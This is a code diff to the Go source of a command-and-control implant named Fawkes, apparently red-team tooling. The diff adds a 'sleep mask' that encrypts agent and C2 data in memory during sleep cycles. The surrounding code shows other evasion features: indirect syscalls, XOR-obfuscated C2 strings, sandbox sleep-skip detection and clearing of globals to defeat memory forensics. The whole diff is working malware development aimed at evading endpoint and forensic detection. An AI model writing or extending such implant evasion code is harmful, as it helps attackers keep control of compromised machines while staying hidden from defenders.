@@ -64,6 +64,7 @@ var (
 	indirectSyscalls  string = ""     // Enable indirect syscalls at startup (Windows only)
 	xorKey            string = ""     // Base64 XOR key for C2 string deobfuscation (empty = plaintext)
 	sandboxGuard      string = ""     // Detect sleep skipping (sandbox fast-forward) and exit silently
+	sleepMask         string = ""     // Encrypt sensitive agent/C2 data in memory during sleep cycles
 )
 
 func main() {
@@ -288,6 +289,7 @@ func runAgent() {
 	// Clear build-time globals — all values have been copied into agent/profile structs.
 	// Prevents memory forensics from extracting sensitive config from the data segment.
 	sandboxGuardEnabled := sandboxGuard == "true"
+	sleepMaskEnabled := sleepMask == "true"
 	clearGlobals()
 
 	// Initialize command handlers
@@ -343,12 +345,12 @@ checkinDone:
 
 	// Start main execution loop - run directly (not as goroutine) so DLL exports block properly
 	log.Printf("[INFO] Starting main execution loop for agent %s", agent.PayloadUUID[:8])
-	mainLoop(ctx, agent, c2, socksManager, maxRetriesInt, sandboxGuardEnabled)
+	mainLoop(ctx, agent, c2, socksManager, maxRetriesInt, sandboxGuardEnabled, sleepMaskEnabled)
 	usePadding() // Reference embedded padding to prevent compiler stripping
 	log.Printf("[INFO] Fawkes agent shutdown complete")
 }
 
-func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager, maxRetriesInt int, sandboxGuardEnabled bool) {
+func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager, maxRetriesInt int, sandboxGuardEnabled bool, sleepMaskEnabled bool) {
 	// Semaphore to limit concurrent task goroutines (prevents memory exhaustion)
 	taskSem := make(chan struct{}, 20)
 
@@ -374,7 +376,14 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 					jitterSeconds := calculateSleepTime(agent.SleepInterval, agent.Jitter) - time.Duration(agent.SleepInterval)*time.Second
 					sleepDuration := time.Duration(waitMinutes)*time.Minute + jitterSeconds
 					log.Printf("[INFO] Outside working hours, sleeping %v until next work period", sleepDuration)
+					var whVault *sleepVault
+					if sleepMaskEnabled {
+						whVault = obfuscateSleep(agent, c2)
+					}
 					time.Sleep(sleepDuration)
+					if sleepMaskEnabled {
+						deobfuscateSleep(whVault, agent, c2)
+					}
 					continue
 				}
 			}
@@ -420,15 +429,26 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 				}(task)
 			}
 
-			// Sleep before next iteration — with optional sandbox detection
+			// Sleep before next iteration — with optional sleep mask and sandbox detection
 			sleepTime := calculateSleepTime(agent.SleepInterval, agent.Jitter)
+			var vault *sleepVault
+			if sleepMaskEnabled {
+				vault = obfuscateSleep(agent, c2)
+			}
+			sleepSkipped := false
 			if sandboxGuardEnabled {
 				if !guardedSleep(sleepTime) {
-					log.Printf("[INFO] Sleep skipping detected, exiting")
-					return
+					sleepSkipped = true
 				}
 			} else {
 				time.Sleep(sleepTime)
+			}
+			if sleepMaskEnabled {
+				deobfuscateSleep(vault, agent, c2)
+			}
+			if sleepSkipped {
+				log.Printf("[INFO] Sleep skipping detected, exiting")
+				return
 			}
 		}
 	}
